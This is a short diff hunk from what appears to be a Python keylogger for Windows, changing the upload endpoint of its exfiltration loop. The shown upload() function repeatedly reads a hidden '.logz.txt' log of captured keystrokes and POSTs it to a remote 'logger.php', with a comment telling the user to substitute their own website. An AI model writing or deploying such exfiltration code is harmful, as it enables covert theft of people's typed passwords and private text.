@@ -4,7 +4,7 @@ import win32gui, win32con
 
 def upload():
 	while True:
-		url = 'http://localhost/logz/logger.php'
+		url = 'https://example.com/logger.php' # <------- Replace this with your website
 		f = open('.logz.txt')
 		logz = f.read()
 		r = requests.post(url, data={'klogz':logz})
